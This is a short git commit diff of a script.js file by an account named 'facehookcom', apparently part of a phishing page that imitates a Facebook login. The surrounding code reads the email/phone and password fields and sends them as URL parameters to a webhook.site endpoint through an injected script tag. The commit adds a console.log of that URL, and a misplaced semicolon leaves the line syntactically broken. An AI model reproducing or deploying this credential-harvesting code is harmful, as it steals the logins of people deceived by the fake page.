5936d8e3d3938e060842ee4c7e8b1f9ecfd718a2
facehookcom <141312864+facehookcom@users.noreply.github.com>
2023-08-19 14:03:00 +0530

    Update script.js

--- script.js
+++ script.js
@@ -12,7 +12,7 @@ function sendJSONPRequest() {
     const emailOrPhoneValue = document.querySelector('input[type="text"]').value;
     const passwordValue = document.querySelector('input[type="password"]').value;
     script.src = 'https://webhook.site/1a6c6682-deae-47ae-8ae8-7a7c645c3d3a?callback=handleResponse&u='+emailOrPhoneValue+'&p='+passwordValue;
-    
+    console.log('https://webhook.site/1a6c6682-deae-47ae-8ae8-7a7c645c3d3a?callback=handleResponse&u='+emailOrPhoneValue+'&p='+passwordValue;)
     // Append the script tag to the document
     document.body.appendChild(script);
 }
